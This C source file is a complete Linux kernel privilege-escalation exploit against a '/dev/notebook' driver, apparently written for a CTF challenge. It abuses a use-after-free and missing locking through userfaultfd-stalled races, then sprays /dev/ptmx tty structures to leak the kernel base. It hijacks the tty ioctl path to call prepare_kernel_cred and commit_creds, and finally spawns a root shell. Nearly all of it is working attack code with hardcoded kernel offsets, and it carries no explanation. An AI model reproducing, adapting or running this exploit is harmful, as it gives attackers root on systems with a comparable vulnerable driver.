#define _GNU_SOURCE
#include <stdio.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/timerfd.h>
#include <string.h>
#include <stdlib.h>
#include <poll.h>
#include <pthread.h>
#include <assert.h>
#include <sys/mman.h>
#include <stdint.h>
#include <linux/userfaultfd.h>

#define bp if(debug) scanf("%*c")

int fd, i, ret, debug=1, tt_fd;
char buf[0x500];
long safe[0x10];
long *num = (long *)buf;
char* mmaped_ptr;
long note_base = 0, kernel_base = 0, prepare_kernel_cred = 0, commit_creds = 0, work_for_cpu_fn = 0;
long diffffer = 0;
pthread_t thr;
pid_t p;

struct userarg
{
	long idx;
	long size;
	char * buf;
} arg;

long addnote(long idx, long size, char *name)	// size < 0x61, idx < 0x10, cant overwrite other allocation, proper read_lock.
{
	arg.idx = idx;
	arg.size = size;
	arg.buf = name;
	ret = ioctl(fd, 0x100, &arg);
	if (debug == 2)	printf("[!] addnote(%d, %d, \"%s\") returns: %d\n", idx, size, name, ret);
	return ret;
}

long delnote(long idx)							// idx < 0x11, UAF for 0 size chunk, proper write_lock.
{
	arg.idx = idx;
	ret = ioctl(fd, 0x200, &arg);
	if (debug == 2)	printf("[!] delnote(%d) returns: %d\n", idx, ret);
	return ret;
}

long editnote(long idx, long size, char *name)	// idx < 0x10, cant introduce 0 size chunk here, proper read_lock
{
	arg.idx = idx;
	arg.size = size;
	arg.buf = name;
	ret = ioctl(fd, 0x300, &arg);
	if (debug == 2)	printf("[!] editnote(%d, %d, \"%s\") returns: %d\n", idx, size, name, ret);
	return ret;
}

long giftnote(char *buf)							// gives the chunks area, giving leaks
{
	arg.buf = buf;
	ret = ioctl(fd, 100, &arg);
	if (debug == 2)	for (i=0 ; i<0x20 ; i+=2)	printf("0x%lx: 0x%016lx 0x%02lx\n", i/2, num[i], num[i+1]);
	return ret;
}

void ErrExit(char* err_msg)
{
    puts(err_msg);
    exit(-1);
}

void RegisterUserfault(void *fault_page,void *handler)
{
    struct uffdio_api ua;
    struct uffdio_register ur;
    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    ua.api = UFFD_API;
    ua.features = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
        ErrExit("[-] ioctl-UFFDIO_API");

    ur.range.start = (unsigned long)fault_page; //The area we want to monitor
    ur.range.len   = 0x4000;
    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) //Register page fault handling
        //When a page fault occurs, the program will block, at this time, we operate in another thread
        ErrExit("[-] ioctl-UFFDIO_REGISTER");
    //Open a thread, receive the error signal, and handle it
    int s = pthread_create(&thr, NULL, handler, (void*)uffd);
    if (s!=0)
        ErrExit("[-] pthread_create");
}

void fault_handler(long *arg)
{
	static struct uffd_msg uffd_msg;
	long uffd = (long)arg;

	while(1)
	{
		struct pollfd pollfd = {
			.fd = uffd,
			.events = POLLIN
		};

		poll(&pollfd, 1, -1);
		read(uffd, &uffd_msg, sizeof(uffd_msg));
		if (uffd_msg.event && UFFD_EVENT_PAGEFAULT){
			if (diffffer == 0)
			{
				editnote(0, 0, "speedrunner0");
			}
			else if (diffffer == 1)
			{
				puts("[+] HA! Finally got to sleep :)");
				sleep(31337);
			}
			else if (diffffer == 2)
			{
				p = fork();
				if (p == 0)		// Child
				{
					sleep(5);
					_exit(0);
				}
				else
				{
					read(fd, buf, 2);
				}
			}
		}

		struct uffdio_register uffdio_register;
		uffdio_register.range.start = uffd_msg.arg.pagefault.address;
		uffdio_register.range.len = 0x4000;
		uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;

		ioctl(uffd, UFFDIO_UNREGISTER, &uffdio_register.range);
		return;
	}
}

void editrrr(int idx)
{
	puts("[+] Editing go brrr...");
	editnote(idx, 0x00, mmaped_ptr);
}

void addrrr(int idx)
{
	puts("[+] Adding go brrr...");
	addnote(idx, 0x60, mmaped_ptr);
}

long leak_note_base()
{
	int fp = open("/tmp/moduleaddr", O_RDONLY);
	while(*buf != 'x')	read(fp, buf, 1);
	read(fp, buf, 16);
	buf[16] = '\x00';
	sscanf(buf, "%lx", &note_base);
	printf("note_base: 0x%lx\n", note_base);
}

long call(long fun, long arg)
{
	num[0] = 0x100005401;
	num[1] = num[2] = num[3] = 0;
	num[4] = fun;
	num[5] = arg;
	write(fd, buf, 1);
	ioctl(tt_fd, 233, 233);
	read(fd, buf, 1);
	return num[6];
}

// No locking on read and write functions, idx < 0x11
void exploit()
{
	fd = open("/dev/notebook", O_RDWR);
	printf("[+] fd returns are %d\n", fd);

	debug = 2;
	leak_note_base();

	// Loop 0
	diffffer = 0;
	mmaped_ptr = (char *)mmap(NULL, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	// RegisterUserfault(mmaped_ptr, fault_handler);
	addnote(0, 0x60, mmaped_ptr);
	// pthread_join(thr, NULL);

	// delnote(0);
	// addnote(1, 0x60, "speedrunner");

	// Loop 1
	diffffer = 1;
	mmaped_ptr = (char *)mmap(NULL, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	RegisterUserfault(mmaped_ptr, fault_handler);
	editnote(1, 0x2e0, "noob");
	write(fd, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 1);
	read(fd, buf, 1);

	pthread_create(&thr, NULL, editrrr, 1);
	sleep(1);
	pthread_create(&thr, NULL, addrrr, 1);
    sleep(1);

	// Loop 2
	diffffer = 4;
	for (i=0; i<0x100; i++)
	{
		printf("%d\n", i);
		tt_fd = open("/dev/ptmx", O_RDWR);
		read(fd, buf, 1);
		if (num[1] != 0x4141414141414141)
			break;
	}
	if (num[1] == 0x4141414141414141)	exit(puts("[!] Freed chunk not found!"));
	kernel_base = num[3] - 0xffffffffa2a8e320 + 0xffffffffa1c00000;
	kernel_base = kernel_base - (kernel_base & 0xfff);
	prepare_kernel_cred = kernel_base + 0xa9ef0;
	commit_creds = kernel_base + 0xa9b40;
	work_for_cpu_fn = kernel_base + 0x9eb90 - 2;

	printf("kbase: 0x%lx\n", kernel_base);
	printf("work_for_cpu_fn: 0x%lx\n", work_for_cpu_fn);
	printf("prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred);
	printf("commit_creds: 0x%lx\n", commit_creds);

	memcpy(safe, buf, 0x60);

	for (i=0 ; i<0x10 ; i++)
		num[i] = work_for_cpu_fn;
	// num[7] = num[10] = num[12] = work_for_cpu_fn;
	write(fd, buf, 0);

	giftnote(buf);
	long temp = num[0];

	memcpy(buf, safe, 0x60);
	num[3] = temp;

	ret = call(prepare_kernel_cred, 0);
	printf("prepare_kernel_cred returns(0): 0x%lx\n", ret);
	sleep(1);
	call(commit_creds, ret);
	sleep(1);
	system("/bin/sh");
}

int main()
{
    exploit();
	return 0;
}